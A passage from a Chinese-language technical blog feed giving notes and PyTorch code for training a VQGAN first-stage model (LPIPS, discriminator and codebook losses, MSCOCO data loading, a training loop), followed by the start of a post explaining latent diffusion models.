self.load_state_dict(sd, strict=<span class="literal">False</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Restored from <span class="subst">&#123;path&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></p><h2 id="loss">Loss</h2><p>官方的Loss写的其实挺抽象的, 后来去看了outlier的视频发现他把官方的整合类拆开了然后自己手动在train的部分手写了一个loss.</p><p>仔细思考了一下感觉似乎还是官方的方式会好一些,毕竟确实loss设计的逻辑很多很杂,抽开来看确实容易理解,但是代码复用性就挺差的.</p><p>首先这个First stage的模型的损失函数是一个混合函数. 官方给他命名为<code>VQLPIPSWithDiscriminator</code>,拆开来就是VQ + LPIPS + Discriminator.</p><h3 id="vq">VQ</h3><p>这个部分刚刚已经说过了, codebook loss的部分会直接被手动计算进行返回.</p><h3 id="lpips">LPIPS</h3><p>全名Learned Perceptual Image Patch Similarity, 即感知损失. 它能做到什么事情呢?</p><p>传统MSE损失: 如果你把图片全局向左平移一格,由于每个像素都得到了巨幅改变,会导致MSE巨大. 然而这是不合理的, 一格像素的平移不应该造成这么大的损失, 尤其对于人的肉眼而言, 一格像素的平移应该是没有多少<strong>感知差异</strong>的.</p><p>所以LPIP做到的就是从人的感知差异层面做误差判断. 具体来说就是训练一个vgg来模拟人类视觉感知从而对图片进行<strong>感知层面</strong>的正确评估.</p><p>代码我直接抄的CompVis官方的,顺便官方提供了已经训练好的vgg,直接load就行.</p><p><a href="https://github.com/CompVis/taming-transformers/blob/master/taming/modules/losses/lpips.py#L11">官方代码</a></p><p>这个部分会负责返回Perceptual Loss</p><h3 id="reconstruction-loss">Reconstruction Loss</h3><p>这个部分官方直接用的L1损失, 对p_loss做权重之后和reconstruction loss一起取平均就构成了perceptual_rec_loss <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, codebook_loss, inputs, reconstructions, global_step, last_layer=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="comment"># L1 reconstruction loss</span></span><br><span class="line">    rec_loss = torch.<span class="built_in">abs</span>(inputs.contiguous() - reconstructions.contiguous())</span><br><span class="line">    <span class="comment"># perceptual loss</span></span><br><span class="line">    p_loss = self.perceptual_loss(inputs.contiguous(), reconstructions.contiguous())</span><br><span class="line">    <span class="comment"># weight * p_loss and get mean</span></span><br><span class="line">    perceptual_rec_loss = torch.mean(rec_loss + self.perceptual_weight * p_loss)</span><br></pre></td></tr></table></figure></p><h3 id="discriminator-loss">Discriminator Loss</h3><p>这个discriminator loss就是用的GAN的idea了. Discriminator的代码可以直接<a href="https://github.com/CompVis/taming-transformers/blob/master/taming/modules/discriminator/model.py#L17">照抄</a>. <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">self.discriminator = NLayerDiscriminator(input_nc=disc_in_channels,</span><br><span class="line">                                                 n_layers=disc_num_layers,</span><br><span class="line">                                                 use_actnorm=use_actnorm,</span><br><span class="line">                                                 ndf=disc_ndf</span><br><span class="line">                                                 ).apply(weights_init)</span><br></pre></td></tr></table></figure></p><p>然后损失部分后续:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, codebook_loss, inputs, reconstructions, global_step, last_layer=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    ################</span></span><br><span class="line"><span class="string">    Reconstruction Loss part here</span></span><br><span class="line"><span class="string">    ################</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># discriminator part</span></span><br><span class="line">    disc_real = self.discriminator(inputs)</span><br><span class="line">    disc_fake = self.discriminator(reconstructions)</span><br><span class="line">    <span class="comment"># generator loss</span></span><br><span class="line">    g_loss = -torch.mean(disc_fake)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># discriminator loss</span></span><br><span class="line">    disc_factor = adopt_weight(self.disc_factor, global_step, threshold=self.discriminator_iter_start)</span><br><span class="line">    d_loss = disc_factor * self.disc_loss(disc_real, disc_fake)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># get d_weight by calling `calculate_adaptive_weight`</span></span><br><span class="line">    d_weight = self.calculate_adaptive_weight(perceptual_rec_loss, g_loss, last_layer=last_layer)</span><br><span class="line">    vq_loss = perceptual_rec_loss + self.codebook_weight * codebook_loss + disc_factor * d_weight * d_loss</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> vq_loss, d_loss</span><br></pre></td></tr></table></figure><p>adopt_weight对discriminator进行延后设置(即多少全局步数之后才会启用discriminator).</p><p>最后把real input和reconstruct input进行输入,使用hinge loss进行误差计算, 然后生成一个d_loss,即discriminator loss.</p><p>这里还会涉及一个g_loss来求得一个所谓的lambda(outlier是这么说的),也就是这里的d_weight. 这里我不太了解细节,估计是GAN相关知识?后续有机会再补.</p><p>这个生成的d_weight作为discriminator的误差权重加入最终误差vq_loss的计算,然后返回vq_loss和d_loss.</p><h3 id="完整loss代码">完整loss代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">VQLPIPSWithDiscriminator</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, disc_start=<span class="number">1</span>, codebook_weight=<span class="number">1.0</span>,</span></span><br><span class="line"><span class="params">                 disc_num_layers=<span class="number">3</span>, disc_in_channels=<span class="number">3</span>, disc_factor=<span class="number">1.0</span>, disc_weight=<span class="number">0.6</span>,</span></span><br><span class="line"><span class="params">                 perceptual_weight=<span class="number">1.0</span>, use_actnorm=<span class="literal">False</span>, disc_conditional=<span class="literal">False</span>,</span></span><br><span class="line"><span class="params">                 disc_ndf=<span class="number">64</span>, disc_loss=<span class="string">&quot;hinge&quot;</span></span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        self.codebook_weight = codebook_weight</span><br><span class="line">        self.perceptual_loss = LPIPS().<span class="built_in">eval</span>()</span><br><span class="line">        self.perceptual_weight = perceptual_weight</span><br><span class="line">        self.discriminator = NLayerDiscriminator(input_nc=disc_in_channels,</span><br><span class="line">                                                 n_layers=disc_num_layers,</span><br><span class="line">                                                 use_actnorm=use_actnorm,</span><br><span class="line">                                                 ndf=disc_ndf</span><br><span class="line">                                                 ).apply(weights_init)</span><br><span class="line">        self.discriminator_iter_start = disc_start</span><br><span class="line">        <span class="keyword">if</span> disc_loss == <span class="string">&quot;hinge&quot;</span>:</span><br><span class="line">            self.disc_loss = hinge_d_loss</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">f&quot;Unknown GAN loss &#x27;<span class="subst">&#123;disc_loss&#125;</span>&#x27;.&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;VQLPIPSWithDiscriminator running with <span class="subst">&#123;disc_loss&#125;</span> loss.&quot;</span>)</span><br><span class="line">        self.disc_factor = disc_factor</span><br><span class="line">        self.discriminator_weight = disc_weight</span><br><span class="line">        self.disc_conditional = disc_conditional</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">calculate_adaptive_weight</span>(<span class="params">self, nll_loss, g_loss, last_layer=<span class="literal">None</span></span>):</span><br><span class="line">        <span class="comment"># calculating d_weight</span></span><br><span class="line">        <span class="keyword">if</span> last_layer <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            nll_grads = torch.autograd.grad(nll_loss, last_layer, retain_graph=<span class="literal">True</span>)[<span class="number">0</span>]</span><br><span class="line">            g_grads = torch.autograd.grad(g_loss, last_layer, retain_graph=<span class="literal">True</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            nll_grads = torch.autograd.grad(nll_loss, self.last_layer[<span class="number">0</span>], retain_graph=<span class="literal">True</span>)[<span class="number">0</span>]</span><br><span class="line">            g_grads = torch.autograd.grad(g_loss, self.last_layer[<span class="number">0</span>], retain_graph=<span class="literal">True</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        d_weight = torch.norm(nll_grads) / (torch.norm(g_grads) + <span class="number">1e-4</span>)</span><br><span class="line">        d_weight = torch.clamp(d_weight, <span class="number">0.0</span>, <span class="number">1e4</span>).detach()</span><br><span class="line">        d_weight = d_weight * self.discriminator_weight</span><br><span class="line">        <span class="keyword">return</span> d_weight</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, codebook_loss, inputs, reconstructions, global_step, last_layer=<span class="literal">None</span></span>):</span><br><span class="line">        <span class="comment"># L1 reconstruction loss</span></span><br><span class="line">        rec_loss = torch.<span class="built_in">abs</span>(inputs.contiguous() - reconstructions.contiguous())</span><br><span class="line">        <span class="comment"># perceptual loss</span></span><br><span class="line">        p_loss = self.perceptual_loss(inputs.contiguous(), reconstructions.contiguous())</span><br><span class="line">        <span class="comment"># weight * p_loss and get mean</span></span><br><span class="line">        perceptual_rec_loss = torch.mean(rec_loss + self.perceptual_weight * p_loss)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># discriminator part</span></span><br><span class="line">        disc_real = self.discriminator(inputs)</span><br><span class="line">        disc_fake = self.discriminator(reconstructions)</span><br><span class="line">        <span class="comment"># generator loss</span></span><br><span class="line">        g_loss = -torch.mean(disc_fake)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># discriminator loss</span></span><br><span class="line">        disc_factor = adopt_weight(self.disc_factor, global_step, threshold=self.discriminator_iter_start)</span><br><span class="line">        d_loss = disc_factor * self.disc_loss(disc_real, disc_fake)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># get d_weight by calling `calculate_adaptive_weight`</span></span><br><span class="line">        d_weight = self.calculate_adaptive_weight(perceptual_rec_loss, g_loss, last_layer=last_layer)</span><br><span class="line">        vq_loss = perceptual_rec_loss + self.codebook_weight * codebook_loss + disc_factor * d_weight * d_loss</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> vq_loss, d_loss</span><br></pre></td></tr></table></figure><p>复杂吗?确实挺复杂的,三类误差全部丢到一个类里面怎么才能不复杂, 官方写vqgan的时候甚至使用的是<code>pl.LightningModule</code>,这是一个pytorch的高级框架,里面有些参数(比如optimizer_idx)是框架处理的,读起来就更加费劲. 不过多亏了outlier的视频和代码最终的实现才简单不少.</p><p>不过最终考虑到模块功能确实是求损失函数我还是选择了把这些一起丢到了<code>VQLPIPSWithDiscriminator</code>这个类.</p><h2 id="dataset和train_class">dataset和train_class</h2><h3 id="数据集">数据集</h3><p>数据集用的mscoco.</p><p>使用说明地址:<br /><a href="https://github.com/rom1504/img2dataset/blob/main/dataset_examples/mscoco.md">https://github.com/rom1504/img2dataset/blob/main/dataset_examples/mscoco.md</a></p><p>下载下来了解了一下发现是webdataset,手动写个载入.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torchvision.transforms <span class="keyword">as</span> transforms</span><br><span class="line"><span class="keyword">import</span> webdataset <span class="keyword">as</span> wds</span><br><span class="line"><span class="keyword">from</span> torch.utils.data <span class="keyword">import</span> DataLoader</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">preprocessing</span>(<span class="params">sample</span>):</span><br><span class="line">    txt, img = sample</span><br><span class="line">    preproc = transforms.Compose([</span><br><span class="line">        transforms.Resize((<span class="number">256</span>, <span class="number">256</span>)),</span><br><span class="line">        transforms.ToTensor(),</span><br><span class="line">    ])</span><br><span class="line">    <span class="keyword">return</span> txt, preproc(img)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_dataloader</span>(<span class="params">file_path, batch_size</span>):</span><br><span class="line">    dirpath = file_path</span><br><span class="line">    dataset = wds.WebDataset(dirpath).shuffle(<span class="number">1000</span>).decode(<span class="string">&quot;pil&quot;</span>).to_tuple(<span class="string">&quot;txt&quot;</span>, <span class="string">&quot;jpg&quot;</span>).<span class="built_in">map</span>(preprocessing)</span><br><span class="line">    dataloader = DataLoader(dataset, batch_size=batch_size)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> dataloader</span><br></pre></td></tr></table></figure><h3 id="trainer">trainer</h3><p>因为我把loss还是选择了丢在一个类里,所以我最终实现可能看起来比outlier简单一点</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> torchvision <span class="keyword">import</span> utils <span class="keyword">as</span> vutils</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">sys.path.append(<span class="string">&quot;/home/lxia&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> ldm.data.mscoco_dataloader <span class="keyword">import</span> get_dataloader</span><br><span class="line"><span class="keyword">from</span> ldm.loss.vqperceptual <span class="keyword">import</span> VQLPIPSWithDiscriminator</span><br><span class="line"><span class="keyword">from</span> ldm.model.ldm <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># https://github.com/dome272/VQGAN-pytorch/blob/main/training_vqgan.py</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TrainVQ</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, vq, dataloader, num_epochs, lr=<span class="number">1e-6</span>, betas=(<span class="params"><span class="number">0.5</span>, <span class="number">0.9</span></span>), device=<span class="string">&#x27;cuda&#x27;</span></span>):</span><br><span class="line">        <span class="keyword">if</span> device == <span class="string">&#x27;cuda&#x27;</span>:</span><br><span class="line">            self.device = torch.device(<span class="string">&quot;cuda&quot;</span>) <span class="keyword">if</span> torch.cuda.is_available() <span class="keyword">else</span> torch.device(<span class="string">&quot;cpu&quot;</span>)</span><br><span class="line">        self.vq = vq.to(self.device)</span><br><span class="line">        self.dataloader = dataloader</span><br><span class="line">        self.lr = lr</span><br><span class="line">        self.betas = betas</span><br><span class="line">        self.vq_perceptual_disc = VQLPIPSWithDiscriminator().to(self.device)</span><br><span class="line">        self.num_epochs = num_epochs</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_optimizer_autoencoder</span>(<span class="params">self</span>):</span><br><span class="line">        autoencoder = self.vq</span><br><span class="line">        lr = self.lr</span><br><span class="line">        betas = self.betas</span><br><span class="line">        optimizer = torch.optim.Adam(<span class="built_in">list</span>(autoencoder.encoder.parameters()) +</span><br><span class="line">                                     <span class="built_in">list</span>(autoencoder.decoder.parameters()) +</span><br><span class="line">                                     <span class="built_in">list</span>(autoencoder.vq.parameters()) +</span><br><span class="line">                                     <span class="built_in">list</span>(autoencoder.quant_conv.parameters()) +</span><br><span class="line">                                     <span class="built_in">list</span>(autoencoder.post_quant_conv.parameters()),</span><br><span class="line">                                     lr=lr, betas=betas</span><br><span class="line">                                     )</span><br><span class="line">        <span class="keyword">return</span> optimizer</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_optimizer_discriminator</span>(<span class="params">self</span>):</span><br><span class="line">        discriminator = self.vq_perceptual_disc.discriminator</span><br><span class="line">        lr = self.lr</span><br><span class="line">        betas = self.betas</span><br><span class="line">        optimizer = torch.optim.Adam(<span class="built_in">list</span>(discriminator.parameters()),</span><br><span class="line">                                     lr=lr, betas=betas</span><br><span class="line">                                     )</span><br><span class="line">        <span class="keyword">return</span> optimizer</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">train</span>(<span class="params">self</span>):</span><br><span class="line">        opt_autoencoder = self.get_optimizer_autoencoder()</span><br><span class="line">        opt_discriminator = self.get_optimizer_discriminator()</span><br><span class="line">        counter = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> epoch <span class="keyword">in</span> <span class="built_in">range</span>(self.num_epochs):</span><br><span class="line">            <span class="keyword">with</span> tqdm(self.dataloader) <span class="keyword">as</span> pbar:</span><br><span class="line">                <span class="keyword">for</span> i, (_, (txt, img)) <span class="keyword">in</span> <span class="built_in">enumerate</span>(<span class="built_in">zip</span>(pbar, self.dataloader)):</span><br><span class="line">                    counter += <span class="built_in">len</span>(img)</span><br><span class="line">                    img = img.to(self.device)</span><br><span class="line">                    decoded_img, codebook_loss = self.vq(img)</span><br><span class="line">                    vq_loss, d_loss = self.vq_perceptual_disc(codebook_loss=codebook_loss,</span><br><span class="line">                                                              inputs=img,</span><br><span class="line">                                                              reconstructions=decoded_img,</span><br><span class="line">                                                              global_step=counter,</span><br><span class="line">                                                              last_layer=self.vq.get_last_layer()</span><br><span class="line">                                                              )</span><br><span class="line">                    opt_autoencoder.zero_grad()</span><br><span class="line">                    opt_discriminator.zero_grad()</span><br><span class="line"></span><br><span class="line">                    <span class="comment"># not to free the grads after `backward` is called</span></span><br><span class="line">                    vq_loss.backward(retain_graph=<span class="literal">True</span>)</span><br><span class="line">                    d_loss.backward()</span><br><span class="line"></span><br><span class="line">                    opt_autoencoder.step()</span><br><span class="line">                    opt_discriminator.step()</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> i % <span class="number">1000</span> == <span class="number">0</span>:</span><br><span class="line">                        <span class="keyword">with</span> torch.no_grad():</span><br><span class="line">                            real_fake_images = torch.cat((img[:<span class="number">4</span>], decoded_img.add(<span class="number">1</span>).mul(<span class="number">0.5</span>)[:<span class="number">4</span>]))</span><br><span class="line">                            vutils.save_image(real_fake_images, os.path.join(<span class="string">&quot;results&quot;</span>, <span class="string">f&quot;<span class="subst">&#123;epoch&#125;</span>_<span class="subst">&#123;i&#125;</span>.jpg&quot;</span>), nrow=<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">                    pbar.set_postfix(</span><br><span class="line">                        vq_Loss=np.<span class="built_in">round</span>(vq_loss.cpu().detach().numpy().item(), <span class="number">5</span>),</span><br><span class="line">                        d_Loss=np.<span class="built_in">round</span>(d_loss.cpu().detach().numpy().item(), <span class="number">3</span>)</span><br><span class="line">                    )</span><br><span class="line">                    pbar.update(<span class="number">0</span>)</span><br><span class="line">                torch.save(self.vq.state_dict(), os.path.join(<span class="string">&quot;checkpoints&quot;</span>, <span class="string">f&quot;vq_epoch_<span class="subst">&#123;epoch&#125;</span>.pt&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    BATCH_SIZE = <span class="number">4</span></span><br><span class="line">    device = <span class="string">&quot;cuda&quot;</span> <span class="keyword">if</span> torch.cuda.is_available() <span class="keyword">else</span> <span class="string">&quot;cpu&quot;</span></span><br><span class="line"></span><br><span class="line">    data_path = <span class="string">&#x27;/home/lxia/ldm/data/dataset/&#123;00000..00059&#125;.tar&#x27;</span></span><br><span class="line">    dataloader = get_dataloader(data_path, batch_size=BATCH_SIZE)</span><br><span class="line"></span><br><span class="line">    num_residual = <span class="number">2</span></span><br><span class="line">    vq = VQModel(n_e=<span class="number">4096</span>, e_dim=<span class="number">256</span>, beta=<span class="number">0.25</span>, input_channel=<span class="number">256</span>, num_res=num_residual)</span><br><span class="line">    num_epochs = <span class="number">20</span></span><br><span class="line">    trainer = TrainVQ(vq=vq, dataloader=dataloader, num_epochs=num_epochs)</span><br><span class="line"></span><br><span class="line">    trainer.train()</span><br></pre></td></tr></table></figure><p>batch设置过高会直接oom,量力而行. 个人感觉数据集也挺大的,所以其实也训练了超级久,可以尝试把tar文件仅载入0-9而不是0-59,然后epoch做做设置,训练应该会快不少.</p><p>我目前自己跑的大概进行了半个epoch效果如图,目测多几个epoch效果会显著不少. <img src="result.png" /></p>]]></content>
      
      
      <categories>
          
          <category> ML Diffusion model </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>diffusion model(2)-LDM</title>
      <link href="/2024/04/11/diffusion-model-2-LDM/"/>
      <url>/2024/04/11/diffusion-model-2-LDM/</url>
      
        <content type="html"><![CDATA[<p>一开始是看的Stable diffusion的,以为是这里开始讲conditioning mechanisms的,后来发现他们idea是从LDM过来的,那么这次就学习一下LDM,这次没来得及看模型,这两天稍微有点忙,看周末会不会有空补一下了.</p><h2 id="latent-diffusion-models">Latent Diffusion Models</h2><p>LDM区别于我们之前看的一般diffusion model主要在于两点</p><ol type="1"><li><p>之前我们对一般扩散模型是直接喂图片数据. 而LDM对其进行了优化, 它设计了一个encoder和一个decoder, encoder对输入图片进行压缩将其转化到latent space, 然后进行一般diffusion操作之后我们同样会生成一个latent vector, 最后我们对这个生成的latent vector进行decode让其恢复到像素空间即可完成图片生成. 本质高维变低维进行处理. 论文将此方法称为Perceptual Compression.</p></li><li><p>第二个区别就是条件生成了, 其通过在unet主干网络添加cross-attention来进行针对prompt的图片生成.</p></li></ol><h3 id="perceptual-image-compression">Perceptual Image Compression</h3><p>本质实现一个编码解码器,然后这个编码解码器先去学习将图片映射到latent space,第二部再去训练diffusion model作为内层.</p><blockquote><p>感知压缩本质上是一个tradeoff，之前的很多扩散模型没有使用这个技巧也可以进行，但原有的非感知压缩的扩散模型有一个很大的问题在于，由于在像素空间上训练模型，如果我们希望生成一张分辨率很高的图片，这就意味着我们训练的空间也是一个很高维的空间。引入感知压缩就是说通过VAE这类自编码模型对原图片进行处理，忽略掉图片中的高频信息，只保留重要、基础的一些特征。这种方法带来的的好处就像引文部分说的一样，能够<strong>大幅降低训练和采样阶段的计算复杂度</strong>，让文图生成等任务能够在消费级GPU上，在10秒级别时间生成图片，大大降低了落地门槛。</p></blockquote><h3 id="采样因子-f">采样因子 $ f $</h3><p>f = H / h, 其中如果f = 1就相当于没有对空间进行压缩, 如果f越大, 就说明压缩程度越高,需要占用的资源更少但同样也更容易失真. 论文对比了f在{1,2,4,8,16,32},发现在4-16效果较好且推荐LDM-4和LDM-8</p><h3 id="cross-attention">cross attention</h3><p>这个就是为什么LDM可以做到text_to_img,针对text而言可以先做一些tokenization和embedding,之后和传入的img_feature一起做cross attention.</p><p>而作者则是写到了为了预处理y,他们引入了一种新的domain specific encoder $ $ 从而把任意源y编码到中间态 $ (y) $</p><p><img src="ldm_cross_attention.png" /></p><p>然后就是Q为img_feature,KV为text_embedding的attention机制.</p><p><img src="cross_attention.png" /></p><h2 id="implementation4.13">implementation(4.13)</h2><p>首先代码是参考的CompVis的<a href="https://github.com/CompVis/latent-diffusion">repo</a>,首先简要分析一下各个部分的实现,然后看下这周末有没有可能基于之前的简易diffusion model来实现一个简易的ldm.</p><p>既然之前已经分析过了一般diffusion model的工作原理,那么这里就先看看几个新增的部分如何实现, 具体就是encoder,decoder, text_processing, attention mechanism.</p><h3 id="perceptual-image-compression相关">Perceptual Image Compression相关</h3><p>主体在ldm.models.autoencoder.VQModelInterface,其中关键部分为处理encode的decode的部分. 另外中间还有一个VQ过程.</p><h4 id="vqvector-quantization">VQ(Vector Quantization)</h4><p><del>似乎是一个很早的东西,不过我个人第一次见到,记录一下. 参考文章<a href="https://blog.csdn.net/FRkid/article/details/40654841">VQ</a></del> <del>说白了就是VQ会将某个区间内的东西用某个值替换,比如0-1全部映射到0,1-2全部映射到1.</del> <del>不过缺陷就是完全空间划分可能导致不均匀,比如我们需要将0-255映射到4bit,然后所有值都在0-15,那么最后得到的图像就会全部为0.</del> <del>优化方式为聚类算法,比如KMean,手动选择所有点中的centroids,然后再针对centroids进行映射.</del></p><p>4.16: 有点理解错了. 这里的VQ来自于CompVis的另一篇论文,<a href="https://arxiv.org/abs/2012.09841">Taming Transformers for High-Resolution Image Synthesis</a>,本质其实是VQGAN,所以大概的历史发展大概是VQVAE-&gt;VQGAN-&gt;LDM,其中LDM也可以看作是VQ+DDPM. 这个VQ就是压缩图片到隐藏空间的核心所在, 也是所谓的First stage model.</p><p>最本质的VQ其实还是上面划掉的部分,化连续为离散,贴一篇讲解<a href="https://www.spaces.ac.cn/archives/6760#VQ-VAE">VQVAE</a></p><p>从这篇文章看到VQVAE一开始用VQ解决的问题是 1. PixelCNN这种需要离散数据的模型应该如何进行降维,建模,恢复. 2. 对待离散数据中无梯度部分应该如何处理(Straight-Through Estimator).</p><p>而VQGAN, LDM继续延用了VQ这一思想, 这些模型把VQ丢到了第一阶段, 目的是训练一个所谓的autoencoder.</p><h4 id="resnet">resnet</h4><p>首先encoder和decoder里面每一个维度变化都是resnet作为基础块来处理的,对于他们写的resnet不需要太过关注内部处理,只用看最后返回是h+x即可. <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 